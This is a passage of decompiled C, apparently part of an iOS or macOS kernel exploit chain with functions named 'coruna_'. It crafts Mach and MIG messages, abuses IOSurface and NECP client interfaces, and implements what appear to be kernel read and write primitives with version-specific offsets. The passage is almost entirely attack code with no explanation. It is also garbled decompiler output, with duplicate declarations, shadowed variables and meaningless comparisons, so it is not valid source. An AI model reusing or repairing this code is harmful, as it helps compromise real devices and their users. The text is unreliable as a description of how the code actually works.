      *ptr = handle;
      size = _sel_registerName("setCurrentContext:");
      err = _objc_msgSend(version,size,handle);
      if (err != 0) {
        (*(void (*)ptr[0x1a])(0xd33,&scratch);
        (*(void (*)ptr[0x1a])(0x84e8,&scratch);
        u = scratch;
        if ((int)scratch <= (int)scratch) {
          u = scratch;
        }
        if (((u & 0x1f) == 0) &&
           (handle = _CFDictionaryCreateMutable
                              (0,0,k_kernel_kcftypedictionarykeycallbacks_slot,
                               k_kernel_kcftypedictionaryvaluecallbacks_slot), handle != 0)) {
          _CFDictionarySetValue(handle,*ptr,*(uint64_t *)k_kernel_kcfbooleanfalse_slot);
          _CFDictionarySetValue(handle,ptr[1],*(uint64_t *)k_kernel_kcfbooleantrue_slot);
          coruna_cfdictionarysetvalue(handle,ptr[2],u * 4);
          coruna_cfdictionarysetvalue(handle,ptr[3],u);
          coruna_cfdictionarysetvalue(handle,ptr[4],u);
          coruna_cfdictionarysetvalue(handle,ptr[5],4);
          coruna_cfdictionarysetvalue(handle,ptr[6],0x42475241);
          coruna_cfdictionarysetvalue(handle,ptr[7],u * 4 * u);
          addr = (*(void (*)ptr[8])(handle);
          _CFRelease(handle);
          if (addr != 0) {
            host_info = (*(void (*)ptr[9])(addr);
            err = (*(void (*)ptr[10])(addr,0,&host_info);
            if (err == 0) {
              ptr[1] = addr;
              host_info = 0;
              (*(void (*)ptr[0x1a])(0x8ca7,&host_info);
              (*(void (*)ptr[0xf])(1,ptr + 2);
              (*(void (*)ptr[0x10])(0x8d40,(int)ptr[2]);
              (*(void (*)ptr[0x11])(1,&thread_attr);
              (*(void (*)ptr[0x12])(0x8d41,thread_attr);
              *(uint8_t *)((long)ptr + 0x14) = 1;
              size = _sel_registerName("attachImage:toCoreSurface:invertedRender:");
              err = _objc_msgSend(*ptr,size,0x8d41,ptr[1],1);
              if (err != 0) {
                (*(void (*)ptr[0x13])(0x8d40,0x8ce0,0x8d41,thread_attr);
                (*(void (*)ptr[0x11])(1,&bootargs);
                (*(void (*)ptr[0x12])(0x8d41,bootargs);
                (*(void (*)ptr[0x14])(0x8d41,0x81a6,u,u);
                (*(void (*)ptr[0x13])(0x8d40,0x8d00,0x8d41,bootargs);
                err = (*(void (*)ptr[0x15])(0x8d40);
                if (err == 0x8cd5) {
                  (*(void (*)ptr[0x1b])(0,0,u,u);
                  (*(void (*)ptr[0x16])(0,0,u,u);
                  (*(void (*)ptr[0x12])(0x8d41,host_info);
                  (*(void (*)ptr[0x1b])(0,0,u,u);
                  *(uint *)(*(long *)(handle + 0x28) + 0x20) = *(byte *)(handle + 0x39) ^ 1;
                  *(uint32_t *)(*(long *)(handle + 0x28) + 0x21) = 1;
                  do {
                    handle = *(long *)(handle + 0x20);
                    (**(void (**)(handle + 0x60))(0xb71);
                    (**(void (**)(handle + 0x68))(&k_kernel_slot_4100);
                    (**(void (**)(handle + 0x70))();
                    if ((*(byte *)(*(long *)(handle + 0x28) + 0x20) & 1) == 0) {
                      coruna_semaphore_timedwait(*(uint64_t *)(handle + 0x30),1000);
                    }
                  } while ((*(byte *)(*(long *)(handle + 0x28) + 0x20) & 1) == 0);
                  handle = *(long *)(handle + 0x20);
                  ptr = *(long **)(handle + 0x28);
                  if (*(char *)((long)ptr + 0x14) != '\0') {
                    (**(void (**)(handle + 0x80))(0x8d40,(int)ptr[2]);
                    (**(void (**)(handle + 0xb8))(0x8d40,0x8ce0,0x8cd1,&thread_attr);
                    (**(void (**)(handle + 0xc0))(1,&thread_attr);
                    (**(void (**)(handle + 0xb8))(0x8d40,0x8d00,0x8cd1,&bootargs);
                    (**(void (**)(handle + 0xc0))(1,&bootargs);
                    (**(void (**)(handle + 200))(1,ptr + 2);
                  }
                  if (ptr[1] != 0) {
                    host_info = (**(void (**)(handle + 0x48))();
                    err = (**(void (**)(handle + 0x58))(ptr[1],0,&host_info);
                    if (err == 0) {
                      _CFRelease(ptr[1]);
                      ptr[1] = 0;
                    }
                  }
                  if (*ptr == 0) {
                    return;
                  }
                  size = _sel_registerName("release");
                  _objc_msgSend(*ptr,size);
                  return;
                }
              }
              *(uint32_t *)(*(long *)(handle + 0x28) + 0x22) = 1;
              return;
            }
            _CFRelease(addr);
          }
        }
        ptr[1] = 0;
      }
    }
  }
fail:
  *(uint32_t *)(*(long *)(handle + 0x28) + 0x22) = 1;
  return;
}





void coruna_dispatch_group_wait(uint64_t val,long handle)
{
  if (*(long *)(handle + 0x18) != 0) {
    *(uint32_t *)(handle + 0x20) = 1;
    _dispatch_group_wait(*(dispatch_group_t *)(handle + 0x18),0xffffffffffffffff);
    _dispatch_release(*(dispatch_object_t *)(handle + 0x18));
    *(uint64_t *)(handle + 0x18) = 0;
  }
  return;
}





void coruna_free_1b984(long handle,uint64_t *val)
{
  *(uint64_t *)(&k_kernel_slot_18d0 + handle) = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  _free(val);
  return;
}





void coruna_cfdictionarysetvalue(uint64_t val,uint64_t id_2,uint32_t size)
{
  uint64_t u;
  uint32_t scratch;
  
  scratch = size;
  u = _CFNumberCreate(0,9,&scratch);
  _CFDictionarySetValue(val,id_2,u);
  _CFRelease(u);
  return;
}





uint64_t coruna_strlen(uint64_t val,char *path,uint64_t *id_2)
{
  size_t ls1;
  uint64_t u;
  uint64_t scratch;
  
  ls1 = _strlen(path);
  u = coruna_kernel600c_via_ptr_canonicalize_3(val,path,ls1 + 1,&scratch);
  if ((int)u != 0) {
    *id_2 = scratch;
    u = 1;
  }
  return u;
}





unsigned long coruna_kernel600c_via_ptr_canonicalize_3(uint64_t arg,uint64_t val)

{
  int status;
  unsigned long type_id;
  long serial_9;
  long serial;
  uint stack_guard;
  uint cache_31;
  long cache_32;
  long cache_27;
  
  cache_32 = 0;
  cache_27 = 0;
  type_id = coruna_iosurface_wire_meta_offsets(arg,&cache_31,&stack_guard);
  if ((int)type_id != 0) {
    status = coruna_kernel600c_via_ptr_canonicalize_7(arg,val,&cache_27);
    if (status == 0) {
      type_id = coruna_kernel600c_residual_193(arg,cache_27 + (unsigned long)cache_31,&cache_27);
      if (((int)type_id != 0) && (serial_9 = coruna_ptr_canonicalize(arg,cache_27), type_id = 0, serial_9 != 0)) {
        serial_9 = cache_27 + (unsigned long)stack_guard;
        type_id = coruna_kernel600c_residual_193(arg,serial_9,&cache_32);
        if ((int)type_id != 0) {
          if (cache_32 == 0) {
            type_id = 1;
          }
          else {
            serial = coruna_ptr_canonicalize(arg);
            type_id = 0;
            if (serial != 0) {
              status = coruna_call_mach_vm_machine_attribute_29df8_148a8(arg,serial_9,0);
              type_id = (unsigned long)(status != 0);
            }
          }
        }
      }
    }
    else {
      type_id = 0;
    }
  }
  return type_id;
}





uint64_t coruna_buf_init(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_free_1b8e0(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    if ((void *)*val != (void *)0x0) {
      _free((void *)*val);
    }
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    return 0;
  }
  return 0xad001;
}





void coruna_kernel600c_via_buf_grow(long *handle,uint32_t size)
{
  uint u;
  int err;
  long handle;
  
  err = coruna_buf_grow((int)handle,0xc);
  if (err == 0) {
    handle = *handle;
    u = *(uint *)(handle + 1);
    *(uint32_t *)((unsigned long)u + handle) = size;
    *(uint64_t *)((uint32_t *)((unsigned long)u + handle) + 1) = k_kernel_rodata_word_374e0;
    *(int *)(handle + 1) = (int)handle[1] + 0xc;
    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}





uint64_t coruna_buf_grow(long *handle,uint size)
{
  void *ptr;
  
  if ((uint)(*(int *)((long)handle + 0xc) - (int)handle[1]) < size) {
    if (0xfffffbff < size) {
      return 0xad00c;
    }
    if (*(int *)((long)handle + 0xc) == 0) {
      size = size + 0x41c;
      ptr = _calloc((unsigned long)size,1);
    }
    else {
      size = size + 0x400;
      ptr = _realloc((void *)*handle,(unsigned long)((int)handle[1] + size));
    }
    if (ptr == (void *)0x0) {
      return 0xad009;
    }
    *handle = (long)ptr;
    *(uint *)((long)handle + 0xc) = (int)handle[1] + size;
    if ((int)handle[1] == 0) {
      *(uint32_t *)(handle + 1) = 0x1c;
      return 0;
    }
  }
  return 0;
}





void coruna_kernel600c_via_buf_grow_2(long *handle,uint64_t val,uint32_t size)
{
  uint64_t *ptr;
  int err;
  
  err = coruna_buf_grow((int)handle,0x10);
  if (err == 0) {
    ptr = (uint64_t *)((unsigned long)*(uint *)(handle + 1) + *handle);
    *ptr = val;
    *(uint32_t *)(ptr + 1) = 0x2130000;
    *(uint32_t *)((long)ptr + 0xc) = size;
    *(int *)(handle + 1) = (int)handle[1] + 0x10;
    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}





uint64_t coruna_memcpy_1ba94(long *handle,void *ctx,unsigned long arg)
{
  uint64_t u;
  
  u = coruna_buf_grow(handle,arg);
  if ((int)u == 0) {
    _memcpy((void *)((unsigned long)*(uint *)(handle + 1) + *handle),ctx,arg & 0xffffffff);
    *(int *)(handle + 1) = (int)handle[1] + (int)arg;
  }
  return u;
}





uint coruna_mach_msg(uint64_t *val,uint32_t size,uint32_t flags_2,uint32_t version_3)
{
  uint32_t u;
  int err;
  mach_msg_size_t send_size;
  uint size;
  uint version;
  uint32_t *ptr;
  
  version = 0xad001;
  if ((val != (uint64_t *)0x0) &&
     (ptr = (uint32_t *)*val, ptr != (uint32_t *)0x0)) {
    err = *(int *)(val + 2);
    u = 0x1514;
    if (err != 0) {
      u = 0x80001514;
    }
    *ptr = u;
    send_size = *(mach_msg_size_t *)(val + 1);
    ptr[1] = send_size;
    ptr[2] = flags_2;
    ptr[3] = size;
    ptr[4] = 0;
    ptr[5] = version_3;
    ptr[6] = err;
    size = _mach_msg((mach_msg_header_t *)*val,0x40001,send_size,0,0,0,0);
    version = 0;
    if (size != 0) {
      version = size | 0x80000000;
    }
  }
  return version;
}





void coruna_ioservicegetmatchingservice_1bb7c(void)
{
  long handle;
  
  handle = _IOServiceMatching();
  if (handle != 0) {
    _IOServiceGetMatchingService(*(uint32_t *)k_kernel_kiomasterportdefault_slot,handle);
    return;
  }
  return;
}





void coruna_mig_dealloc_reply_port(mach_port_t port,uint64_t val,uint64_t id_2,uint32_t size,
                 uint32_t flags_2,void *ctx,int flags)
{
  unsigned long u;
  uint size;
  byte err;
  mach_port_t rcv_name;
  int err;
  mach_msg_return_t lm5;
  int status;
  mach_msg_header_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint32_t serial_buf;
  uint64_t scratch;
  uint64_t action;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t block_ctx;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_saved;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t sa_new;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t path_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t tmp_buf;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  long region;
  
  region = *(long *)k_kernel_stack_chk_guard_slot;
  cache_20 = 0;
  tmp_buf = 0;
  cache_22 = 0;
  cache_21 = 0;
  frame = 0;
  path_buf = 0;
  cache = 0;
  work = 0;
  plist = 0;
  sa_new = 0;
  json_buf = 0;
  url_buf = 0;
  path_buf = 0;
  sa_saved = 0;
  region = 0;
  tmp_buf = 0;
  stack_guard = 0;
  stack_guard = 0;
  sa_new = 0;
  sa_saved = 0;
  serial_buf = 0;
  block_ctx = 0;
  block_ctx = 0;
  action = 0;
  bootargs = 0;
  action = 0;
  host_info = 0;
  thread_attr = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch.msgh_reserved = 0;
  scratch.msgh_id = 0;
  scratch = 0;
  host_info = 0;
  serial_buf = 0;
  scratch.msgh_remote_port = 0;
  scratch.msgh_local_port = 0;
  scratch.msgh_bits = 0;
  scratch.msgh_size = 0;
  rcv_name = _mig_get_reply_port();
  if (rcv_name == 0) {
    status = 0;
    err = 0;
    err = 1;
  }
  else {
    scratch.msgh_bits = 0x80001513;
    scratch.msgh_local_port = rcv_name;
    scratch.msgh_remote_port = port;
    scratch.msgh_id = (mach_msg_id_t)k_kernel_rodata_word_37738;
    bootargs = (int)((unsigned long)k_kernel_rodata_word_37738 >> 0x20);
    thread_attr = (int)id_2;
    host_info = (int)((unsigned long)id_2 >> 0x20);
    serial_buf = 0x1000000;
    scratch = coruna_u64_pack((flags_2), (size));
    action = coruna_u64_pack((0x140000), ((uint32_t))action);
    bootargs = *(uint64_t *)k_kernel_ndr_record_slot;
    err = ___strlcpy_chk(&host_info,val,0x80,0x80);
    size = err + 1;
    err = 0;
    if ((size & 7) != 0) {
      err = 8 - (size & 7);
    }
    size = err + size;
    thread_attr = coruna_u64_pack((size), ((uint32_t))thread_attr);
    u = (unsigned long)size;
    *(uint32_t *)((long)&host_info + u) = size;
    *(int *)((long)&host_info + u + 4) = flags;
    _memcpy((void *)((long)&block_ctx + u),ctx,(unsigned long)(uint)(flags << 3));
    lm5 = _mach_msg(&scratch,3,size + flags * 8 + 0x50,0x110,rcv_name,0,0);
    if (lm5 == 0) {
      if (scratch.msgh_id == 0xb9a) {
        if (((int)scratch.msgh_bits < 0) && (bootargs == 1)) {
          err = 1;
          err = thread_attr;
          status = 0;
        }
        else {
          err = 0;
          err = 1;
          status = host_info;
        }
      }
      else {
        err = 0;
        err = 1;
        status = -0x12d;
      }
    }
    else {
      _mig_dealloc_reply_port(rcv_name);
      err = 0;
      err = 0;
      status = 0;
    }
  }
  if (!(bool)(err & status == 0 & err != 0 & err != -1)) {
    err = 0;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == region) {
    return;
  }
  ___stack_chk_fail(err);
}





uint64_t coruna_ioservice_publish_1bdc0(uint64_t val,uint64_t id_2,mach_port_name_t *arg)
{
  uint8_t *ptr;
  mach_port_t host;
  kern_return_t lk2;
  uint64_t u;
  mach_port_name_t scratch;
  io_master_t bootargs;
  
  host = _mach_host_self();
  lk2 = _host_get_io_master(host,&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if ((lk2 == 0) &&
     (lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch),
     lk2 == 0)) {
    u = coruna_mig_dealloc_reply_port(bootargs,"IOServicePublish",val,id_2,scratch,0,0);
    if ((int)u != 0) {
      *arg = scratch;
      return u;
    }
    _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
  }
  return 0;
}





uint64_t coruna_ioobjectrelease(uint64_t val,int flags)
{
  int err;
  
  while( true ) {
    if (flags == 0) {
      return 0x700002d6;
    }
    err = coruna_ioservicegetmatchingservice_1bb7c(val);
    if (1 < err + 1U) break;
    _sleep(1);
    flags = flags + -1;
  }
  _IOObjectRelease();
  return 0;
}





bool coruna_thread_policy_set(thread_act_t arg,thread_policy_t arg_x)
{
  bool err;
  kern_return_t lk2;
  
  lk2 = _thread_policy_set(arg,2,arg_x,4);
  if (lk2 == 0) {
    lk2 = _thread_policy_set(arg,3,arg_x + 4,1);
    err = lk2 == 0;
  }
  else {
    err = false;
  }
  return err;
}





uint64_t coruna_mach_timebase_info(uint64_t val,uint size)
{
  kern_return_t lk1;
  uint64_t u;
  double ld3;
  double ld4;
  mach_timebase_info_t scratch;
  int bootargs;
  int thread_attr;
  int host_info;
  uint64_t serial_buf;
  
  lk1 = _mach_timebase_info(&scratch);
  if (lk1 == 0) {
    ld3 = (double)NEON_ucvtf((unsigned long)scratch.denom);
    ld4 = (double)NEON_ucvtf((unsigned long)scratch.numer);
    ld3 = (ld3 / ld4) * k_kernel_rodata_word_37740;
    bootargs = (int)(ld3 * (double)size);
    thread_attr = (int)(ld3 * 50.0);
    serial_buf = k_kernel_rodata_word_37748;
    host_info = bootargs;
    u = coruna_thread_policy_set(val,&bootargs);
  }
  else {
    u = 0;
  }
  return u;
}





void coruna_call_mach_timebase_info(uint64_t val)
{
  coruna_mach_timebase_info(val,0x32);
  return;
}





uint64_t coruna_slot_clear(long handle,uint size)
{
  uint64_t u;
  
  u = 0xad008;
  if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
    if (0x3f < size) {
      return 0x28011;
    }
    u = 0;
    *(uint32_t *)(*(long *)(handle + 0x118) + (unsigned long)size) = 0;
  }
  return u;
}





uint64_t coruna_mach_absolute_time_1c000(long handle,uint size,uint flags_2)
{
  byte *ptr;
  byte err;
  char err;
  bool status;
  unsigned long u;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  long handle;
  
  port = 0xad008;
  handle = *(long *)(handle + 0x118);
  if ((handle != 0) && (*(long *)(handle + 0x120) != 0)) {
    if (size < 0x40) {
      size = _mach_absolute_time();
      ptr = (byte *)(handle + (unsigned long)size);
      do {
        err = *ptr;
        err = '\x01';
        status = (bool)coruna_ldrex_pass(ptr,0x10);
        if (status) {
          *ptr = 1;
          err = coruna_ldrexp_clear();
        }
      } while (err != '\0');
      while ((err & 1) != 0) {
        if (flags_2 != 0) {
          version = _mach_absolute_time();
          u = 0;
          if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
            u = ((version - size) * (unsigned long)*(uint *)(handle + 0x25c)) /
                    (unsigned long)*(uint *)(handle + 0x260);
          }
          if ((unsigned long)flags_2 < u / 1000000) {
            return 0xad020;
          }
        }
        _thread_switch(0,2,1);
        do {
          err = *ptr;
          err = '\x01';
          status = (bool)coruna_ldrex_pass(ptr,0x10);
          if (status) {
            *ptr = 1;
            err = coruna_ldrexp_clear();
          }
        } while (err != '\0');
      }
      port = 0;
    }
    else {
      port = 0x28011;
    }
  }
  return port;
}





uint coruna_close(int flags)
{
  uint u;
  int err;
  int *err;
  uint *ptr;
  
  err = _close(flags);
  u = 0;
  if (err != 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  return u;
}





uint coruna_open_dev_null(int *flags)
{
  int err;
  uint u;
  int *err;
  uint *ptr;
  
  err = _open("/dev/null",0x20);
  if (err < 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
    *flags = err;
  }
  return u;
}





uint64_t coruna_kernel600c_via_fd_read_full(long handle,long addr_2,uint64_t val,uint32_t size,int flags)
{
  uint8_t *ptr;
  long handle;
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  uint32_t host_info;
  uint32_t scratch;
  uint32_t serial_buf;
  uint32_t bootargs;
  long action;
  uint32_t block_ctx;
  
  u = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1938 + handle) != -1)) &&
     ((*(int *)(&k_kernel_slot_193c + handle) != -1 && (handle = coruna_kptr_in_mapped_range(handle), handle != 0)))) {
    ptr = &k_kernel_slot_1930 + handle;
    block_ctx = 0xffffffff;
    if ((flags == 0) ||
       ((u = coruna_open_dev_null(&block_ctx), (int)u == 0 &&
        (u = coruna_fd_drain(ptr), (int)u == 0)))) {
      scratch = 0;
      serial_buf = 0;
      bootargs = 0x10000000;
      host_info = size;
      action = addr_2;
      u = coruna_write(ptr,&host_info,0x18);
      if (((int)u == 0) && (u = coruna_fd_read_full(ptr,&scratch,0x18), (int)u == 0)) {
        if ((coruna_u64_pack((scratch), (host_info)) == scratch && coruna_u64_pack((bootargs), (serial_buf)) == bootargs)
            && action == thread_attr) {
          u = coruna_fd_read_full(&k_kernel_slot_1938 + handle,val,size);
        }
        else {
          u = 0xad014;
        }
      }
      if (flags == 0) {
        return u;
      }
    }
    coruna_close(block_ctx);
  }
  return u;
}
uint64_t coruna_kernel600c_via_write(long handle,long addr_2,uint64_t val,uint32_t size,int flags)
{
  uint8_t *ptr;
  long handle;
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint32_t block_ctx;
  
  u = 0xad001;
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1938 + handle) != -1)) &&
     ((*(int *)(&k_kernel_slot_193c + handle) != -1 && (handle = coruna_kptr_in_mapped_range(handle), handle != 0)))) {
    ptr = &k_kernel_slot_1930 + handle;
    block_ctx = 0xffffffff;
    if ((flags == 0) ||
       ((u = coruna_open_dev_null(&block_ctx), (int)u == 0 &&
        (u = coruna_fd_drain(ptr), (int)u == 0)))) {
      serial_buf = k_kernel_rodata_word_00037768;
      host_info = k_kernel_rodata_word_37760;
      action = addr_2;
      u = coruna_write(ptr,&host_info,0x18);
      if (((int)u == 0) && (u = coruna_fd_read_full(ptr,&scratch,0x18), (int)u == 0)) {
        if ((host_info == scratch && serial_buf == bootargs) && action == thread_attr) {
          u = coruna_write(&k_kernel_slot_1938 + handle,val,size);
        }
        else {
          u = 0xad014;
        }
      }
      if (flags == 0) {
        return u;
      }
    }
    coruna_close(block_ctx);
  }
  return u;
}





void coruna_kernel600c_residual_227(long handle,uint64_t *val,long addr_2,uint64_t id_2,int flags)
{
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  val[2] = k_kernel_rodata_word_37750;
  *(uint32_t *)((long)val + 0x1c) = 0;
  if ((flags == 7) && (*(long *)(handle + 0x220) != 0)) {
    val[5] = *(long *)(handle + 0x220);
    val[7] = addr_2 + 0x60;
    val[0xd] = id_2;
  }
  else {
    val[5] = addr_2 + 0x60;
    val[7] = id_2;
    *(int *)(val + 0xc) = flags;
  }
  val[8] = 0;
  *(uint8_t *)((long)val + 0x53) = 0x22;
  val[0xb] = 0;
  return;
}





void coruna_kernel600c_via_fd_read_full_2(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint u;
  int err;
  unsigned long size;
  uint8_t scratch[96];
  uint8_t bootargs[96];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  err = coruna_kernel600c_via_kernel600c_via_fd_read_full_3(val,size_3,0x60,bootargs,1);
  if (err == 0) {
    size = 0x2800f;
  }
  else {
    size = coruna_write(id_2,bootargs,0x60);
    if (((int)size == 0) && (size = coruna_fd_read_full(id_2,scratch,0x60), (int)size == 0)) {
      err = _memcmp(bootargs,scratch,0x60);
      u = 0;
      if (err != 0) {
        u = 0xad014;
      }
      size = (unsigned long)u;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(size);
}





void coruna_call_mach_vm_machine_attribute_29df8_1c57c(void)
{
  coruna_kernel600c_via_kernel600c_via_fd_read_full_3();
  return;
}





bool coruna_uuid_is_null(long handle)
{
  uint32_t u;
  int err;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    if (*(long *)(handle + 0x230) == 0) {
      return false;
    }
    if (*(long *)(handle + 0x228) == 0) {
      return false;
    }
    if (*(char *)(handle + 0xb) == '\0') {
      return true;
    }
    u = 0x800100;
  }
  else {
    if (((*(int *)(&k_kernel_slot_1944 + handle) == -1) ||
        (err = _uuid_is_null(&k_kernel_slot_1948 + handle), err != 0)) ||
       (*(long *)(&k_kernel_slot_1958 + handle) == 0)) {
      return false;
    }
    if (*(char *)(handle + 0xb) == '\0') {
      return true;
    }
    u = 0x8000100;
  }
  err = coruna_ctx_test_flag(handle,u);
  return err != 0;
}
unsigned long coruna_necp_client_action(long arg)

{
  long handle;
  uint32_t type_id_17;
  int fd_12;
  int err;
  uint version;
  uint64_t type_id_13;
  unsigned long port;
  long serial_17;
  uint *entry;
  int *idx;
  unsigned long tag;
  uint64_t cache_51;
  int cache_52;
  long cache_28;
  long cache_77 [3];
  uint64_t cache_86;
  long cache_55;
  
  cache_55 = *(long *)k_kernel_stack_chk_guard_slot;
  if (*(unsigned long *)(arg + 0x158) < 0x1f530f02800000) {
    type_id_17 = *(uint32_t *)k_kernel_mach_task_self_slot;
    serial_17 = coruna_call_macho_data_seg_2bb24_2bdb4_2a678(arg,type_id_17,cache_77 + 2);
    port = 0x2800e;
    entry = (uint *)0x0;
    if (serial_17 != 0) {
      *(long *)(arg + 0x230) = serial_17;
      entry = (uint *)coruna_return_zero_2899c(arg,type_id_17);
      if (entry != (uint *)0x0) {
        port = 0;
        *(uint **)(arg + 0x228) = entry;
      }
    }
  }
  else {
    cache_77[1] = 0;
    type_id_13 = _necp_open(0);
    fd_12 = (int)type_id_13;
    if (fd_12 == -1) {
      idx = ___error();
      fd_12 = *idx;
      entry = (uint *)___error();
      version = -*entry;
      if (-1 < fd_12) {
        version = *entry;
      }
      port = (unsigned long)(version | 0x40000000);
    }
    else {
      err = _necp_client_action(type_id_13,1,cache_77 + 2,0x10,cache_77 + 1,8);
      if (err == -1) {
        idx = ___error();
        err = *idx;
        entry = (uint *)___error();
        version = -*entry;
        if (-1 < err) {
          version = *entry;
        }
        port = (unsigned long)(version | 0x40000000);
      }
      else {
        port = coruna_kernel600c_via_ptr_canonicalize_8(arg,type_id_13,cache_77);
        if ((int)port == 0) {
          port = 0x2800f;
          err = coruna_kernel600c_residual_228(arg,cache_77[0] + 0x18,&cache_28);
          if (err != 0) {
            serial_17 = coruna_ptr_canonicalize(arg,cache_28);
            if (serial_17 == 0) {
              port = 0x28026;
            }
            else {
              tag = *(unsigned long *)(arg + 0x158);
              serial_17 = 0x570;
              if (tag < 0x1f541e00000000) {
                serial_17 = 0x370;
              }
              handle = 0x580;
              if (tag >> 0x2b < 1099) {
                handle = serial_17;
              }
              entry = (uint *)coruna_kernel600c_via_kernel600c_via_fd_read_full_3(arg,handle + cache_28,4,&cache_52,1);
              if ((int)entry != 0) {
                if (cache_52 == 8) {
                  serial_17 = 0x578;
                  if (tag < 0x1f541e00000000) {
                    serial_17 = 0x378;
                  }
                  handle = 0x588;
                  if (tag >> 0x2b < 1099) {
                    handle = serial_17;
                  }
                  entry = (uint *)coruna_kernel600c_residual_228(arg,cache_28 + handle,&cache_51);
                  if ((int)entry != 0) {
                    entry = (uint *)coruna_ptr_canonicalize(arg,cache_51);
                    if (entry == (uint *)0x0) {
                      port = 0x28026;
                    }
                    else {
                      port = 0;
                      *(int *)(&k_kernel_slot_1944 + arg) = fd_12;
                      *(uint64_t *)(&UNK_00001950 + arg) = cache_86;
                      *(long *)(&k_kernel_slot_1948 + arg) = cache_77[2];
                      *(long *)(&k_kernel_slot_1958 + arg) = cache_28;
                    }
                  }
                }
                else {
                  port = 0x28011;
                }
                if (*(long *)k_kernel_stack_chk_guard_slot == cache_55) {
                return port;
                }
                ___stack_chk_fail(entry);
              }
            }
          }
        }
      }
      version = _close(fd_12);
      entry = (uint *)(unsigned long)version;
    }
  }
load_ok_60:
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_55) {
    return port;
  }
  ___stack_chk_fail(entry);
}





uint64_t coruna_kernel600c_via_open_dev_null(long handle)
{
  uint64_t u;
  uint32_t scratch;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = 0;
  }
  else {
    scratch = 0xffffffff;
    u = coruna_open_dev_null(&scratch);
    if ((int)u == 0) {
      if (*(int *)(&k_kernel_slot_1944 + handle) != -1) {
        _close(*(int *)(&k_kernel_slot_1944 + handle));
        *(uint32_t *)(&k_kernel_slot_1944 + handle) = 0xffffffff;
      }
      *(uint64_t *)(&UNK_00001950 + handle) = 0;
      *(uint64_t *)(&k_kernel_slot_1948 + handle) = 0;
      *(uint64_t *)(&k_kernel_slot_1958 + handle) = 0;
      coruna_close(scratch);
    }
  }
  return u;
}





uint32_t coruna_ioconnect_fd_setup(long handle)
{
  uint32_t u;
  
  u = 0x80000;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = 0x4000;
  }
  return u;
}





uint64_t coruna_return_zero_1cf78(long handle)
{
  if (((((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       (*(int *)(&k_kernel_slot_1940 + handle) == -1)) || (*(long *)(handle + 0x218) == 0)) &&
     (((*(int *)(handle + 0xe8) + 1U < 2 || (*(long *)(handle + 0xf8) == 0)) ||
      ((*(long *)(handle + 0x100) == 0 || (0x2711 < *(int *)(handle + 0x140))))))) {
    return 0;
  }
  return 1;
}





unsigned long coruna_fcntl_1c9b8(long arg,long val,long n,uint m,int p)

{
  int *i;
  int n;
  long serial_11;
  int *j;
  uint *entry_9;
  uint type_id_13;
  uint port;
  unsigned long type_id_14;
  unsigned long type_id_15;
  unsigned long type_id_16;
  uint tag;
  size_t ls12;
  uint32_t cache_86;
  uint8_t cache_61[160];
  int cache_36 [42];
  long cache_75;
  
  cache_75 = *(long *)k_kernel_stack_chk_guard_slot;
  type_id_16 = 0xad001;
